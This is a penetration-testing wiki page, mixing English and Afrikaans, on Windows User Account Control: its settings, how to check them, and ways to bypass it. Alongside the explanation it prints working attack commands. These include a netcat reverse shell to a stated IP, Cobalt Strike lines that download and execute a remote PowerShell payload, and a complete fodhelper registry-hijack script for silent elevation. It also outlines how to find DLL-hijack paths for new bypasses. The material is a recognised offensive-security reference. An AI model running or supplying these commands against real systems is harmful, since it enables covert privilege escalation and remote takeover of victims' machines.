# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a **consent prompt for elevated activities**. Applications have different `integrity` levels, and a program with a **high level** can perform tasks that **could potentially compromise the system**. When UAC is enabled, applications and tasks always **run under the security context of a non-administrator account** unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run. It is a convenience feature that protects administrators from unintended changes but is not considered a security boundary.

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wanneer UAC in plek is, kry 'n administrateurgebruiker twee tokens: 'n standaardgebruikertoken om gewone aksies op gewone vlak uit te voer, en een met die admin-bevoegdhede.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discusses how UAC works in great depth and includes the logon process, user experience, and UAC architecture. Administrators can use security policies to configure how UAC works specific to their organization at the local level (using secpol.msc), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment. The various settings are discussed in detail [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

### UAC Bypass Theory

Some programs are **autoelevated automatically** if the **user belongs** to the **administrator group**. These binaries have inside their _**Manifests**_ the _**autoElevate**_ option with value _**True**_. The binary has to be **signed by Microsoft** also.

Many auto-elevate processes expose **functionality via COM objects or RPC servers**, which can be invoked from processes running with medium integrity (regular user-level privileges). Note that COM (Component Object Model) and RPC (Remote Procedure Call) are methods Windows programs use to communicate and execute functions across different processes. For example, **`IFileOperation COM object`** is designed to handle file operations (copying, deleting, moving) and can automatically elevate privileges without a prompt.

Note that some checks might be performed, like checking if the process was run from the **System32 directory**, which can be bypassed for example **injecting into explorer.exe** or another System32-located executable.

Another way to bypass these checks is to **modify the PEB**. Every process in Windows has a Process Environment Block (PEB), which includes important data about the process, such as its executable path. By modifying the PEB, attackers can fake (spoof) the location of their own malicious process, making it appear to run from a trusted directory (like system32). This spoofed information tricks the COM object into auto-elevating privileges without prompting the user.

Then, to **bypass** the **UAC** (elevate from **medium** integrity level **to high**) some attackers use this kind of binaries to **execute arbitrary code** because it will be executed from a **High level integrity process**.

You can **check** the _**Manifest**_ of a binary using the tool _**sigcheck.exe**_ from Sysinternals. (`sigcheck.exe -m <file>`) And you can **see** the **integrity level** of the processes using _Process Explorer_ or _Process Monitor_ (of Sysinternals).

### Check UAC

Om te bevestig of UAC aangeskakel is, doen:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
As dit **`1`** is, dan is UAC **geaktiveer**; as dit **`0`** is of dit **nie bestaan** nie, dan is UAC **inaktief**.

Kontroleer dan **watter vlak** gekonfigureer is:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- As **`0`**, sal UAC nie 'n prompt vertoon nie (soos **gedeaktiveer**)
- As **`1`** word die admin **gevra vir gebruikersnaam en wagwoord** om die binêre met hoë regte uit te voer (on Secure Desktop)
- As **`2`** (**Always notify me**) sal UAC altyd bevestiging van die administrator vra wanneer hy probeer iets met hoë voorregte uitvoer (on Secure Desktop)
- As **`3`** soos `1` maar nie nodig op Secure Desktop nie
- As **`4`** soos `2` maar nie nodig op Secure Desktop nie
- As **`5`** (**default**) sal dit die administrator vra om te bevestig om nie-Windows-binêre met hoë voorregte uit te voer

Dan moet jy kyk na die waarde van **`LocalAccountTokenFilterPolicy`**\
As die waarde **`0`** is, dan kan slegs die **RID 500** gebruiker (**built-in Administrator**) **admin take sonder UAC** uitvoer, en as dit `1` is, kan **alle rekeninge in die "Administrators"** groep dit doen.

En uiteindelik kyk na die waarde van die sleutel **`FilterAdministratorToken`**\
As **`0`** (default), kan die **built-in Administrator account** remote administration tasks doen en as **`1`** kan die ingeboude Administratorrekening **nie** remote administration tasks doen nie, tensy `LocalAccountTokenFilterPolicy` op `1` gestel is.

#### Summary

- As `EnableLUA=0` of **bestaan nie**, **geen UAC vir enigiemand nie**
- As `EnableLua=1` en **`LocalAccountTokenFilterPolicy=1`**, **geen UAC vir enigiemand nie**
- As `EnableLua=1` en **`LocalAccountTokenFilterPolicy=0` en `FilterAdministratorToken=0`**, geen UAC vir RID 500 (Built-in Administrator)
- As `EnableLua=1` en **`LocalAccountTokenFilterPolicy=0` en `FilterAdministratorToken=1`**, UAC vir almal

Al hierdie inligting kan ingesamel word met die **metasploit** module: `post/windows/gather/win_privs`

Jy kan ook die groepe van jou gebruiker nagaan en die integriteitsvlak kry:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Neem kennis dat as jy grafiese toegang tot die slagoffer het, UAC bypass reguit is aangesien jy eenvoudig op "Yes" kan klik wanneer die UAC-prompt verskyn

Die UAC bypass is nodig in die volgende situasie: **die UAC is geaktiveer, jou proses loop in 'n medium integrity'-konteks, en jou gebruiker behoort tot die administrators group**.

Dit is belangrik om te noem dat dit **veel moeiliker is om die UAC te bypass as dit op die hoogste sekuriteitsvlak (Always) gestel is as wanneer dit in enige van die ander vlakke (Default) is.**

### UAC disabled

As UAC reeds uitgeschakel is (`ConsentPromptBehaviorAdmin` is **`0`**) kan jy **execute a reverse shell with admin privileges** (high integrity level) gebruik met iets soos:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Baie** Basiese UAC "bypass" (volle toegang tot die lêerstelsel)

As jy 'n shell het met 'n gebruiker wat in die Administrators-groep is, kan jy die gedeelde **C$** via SMB plaaslik op 'n nuwe skyf mount en jy sal **toegang tot alles in die lêerstelsel** hê (selfs die Administrator-tuismap).

> [!WARNING]
> **Dit lyk asof hierdie truuk nie meer werk nie**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass met cobalt strike

Die Cobalt Strike-tegnieke sal slegs werk as UAC nie op sy maksimum sekuriteitsvlak ingestel is nie
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** en **Metasploit** het ook verskeie modules om die **UAC** te **bypass**.

### KRBUACBypass

Dokumentasie en hulpmiddel in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) wat 'n **compilation** is van verskeie UAC bypass exploits. Let wel: jy sal moet **compile UACME using visual studio or msbuild**. Die compilation sal verskeie uitvoerbare lêers skep (soos `Source\Akagi\outout\x64\Debug\Akagi.exe`) , jy sal moet weet **which one you need.**\
Jy moet **be careful** omdat sommige bypasses **prompt some other programs** wat die **user** sal **alert** dat iets gebeur.

UACME het die **build version from which each technique started working**. Jy kan soek na 'n tegniek wat jou weergawes beïnvloed:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ook, deur [this](https://en.wikipedia.org/wiki/Windows_10_version_history) bladsy te gebruik, kry jy die Windows-vrystelling `1607` uit die build-weergawes.

### UAC Bypass – fodhelper.exe (Registry hijack)

Die vertroude binary `fodhelper.exe` word outomaties verhoog op moderne Windows. Wanneer dit gestart word, vra dit die per-user registry-pad hieronder op sonder om die `DelegateExecute` verb te valideer. Deur 'n opdrag daar te plant, kan 'n Medium Integrity-proses (gebruiker is in Administrators) 'n High Integrity-proses spawn sonder 'n UAC-prompt.

Registry path queried by fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell stappe (stel jou payload in, dan trigger):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Aantekeninge:
- Werk wanneer die huidige gebruiker 'n lid is van Administrators en die UAC-vlak is standaard/lins (nie Always Notify met ekstra beperkings nie).
- Gebruik die `sysnative` pad om 'n 64-bit PowerShell vanaf 'n 32-bit proses op 64-bit Windows te start.
- Payload kan enige opdrag wees (PowerShell, cmd, of 'n EXE-pad). Vermy prompting UIs vir stealth.

#### Meer UAC-omseiling

**All** die tegnieke wat hier gebruik word om AUC te omseil **vereis** 'n **volle interaktiewe shell** met die slagoffer ( 'n algemene nc.exe shell is nie genoeg nie).

Jy kan dit kry deur 'n **meterpreter** session te gebruik. Migreer na 'n **process** wat die **Session** waarde gelyk is aan **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ behoort te werk)

### UAC-omseiling met GUI

As jy toegang tot 'n **GUI** het, kan jy net die UAC prompt aanvaar wanneer dit voorkom; jy het nie regtig 'n omseiling nodig nie. Dus, toegang tot 'n GUI sal jou in staat stel om die UAC te omseil.

Boonop, as jy 'n GUI-sessie kry wat iemand gebruik het (potensieel via RDP), is daar **sommige tools wat as administrator sal loop** van waar jy byvoorbeeld 'n **cmd** **as admin** direk kan **run** sonder om weer deur UAC gevra te word, soos [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dit kan 'n bietjie meer **stealthy** wees.

### Lawaaiige brute-force UAC-omseiling

As jy nie omgee om lawaai te maak nie kan jy altyd **iets soos** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) **run** wat bly vra om permissies te verhoog totdat die gebruiker dit aanvaar.

### Jou eie omseiling - Basiese UAC-omseiling metodologie

As jy na **UACME** kyk sal jy opmerk dat **meeste UAC-omseilings 'n Dll Hijacking kwesbaarheid misbruik** (hoofsaaklik deur die kwaadwillige dll op _C:\Windows\System32_ te skryf). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Vind 'n binary wat **autoelevate** (kontroleer dat wanneer dit uitgevoer word dit in 'n high integrity level loop).
2. Met procmon vind "**NAME NOT FOUND**" gebeure wat kwesbaar kan wees vir **DLL Hijacking**.
3. Jy sal waarskynlik die DLL binne sommige **protected paths** (soos C:\Windows\System32) moet **write**, waar jy nie skryfperms het nie. Jy kan dit omseil deur:
   1. **wusa.exe**: Windows 7,8 en 8.1. Dit laat toe om die inhoud van 'n CAB-lêer in beskermde paaie uit te pak (omdat hierdie tool vanaf 'n high integrity level uitgevoer word).
   2. **IFileOperation**: Windows 10.
4. Berei 'n **script** voor om jou DLL binne die beskermde pad te kopieer en die kwesbare en autoelevated binary uit te voer.

### Nog 'n UAC-omseiling tegniek

Bestaan daarin om te kyk of 'n **autoElevated binary** probeer om van die **registry** die **name/path** van 'n **binary** of **command** te **read** wat uitgevoer moet word (dit is meer interessant as die binary hierdie inligting binne die **HKCU** soek).

## Verwysings
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
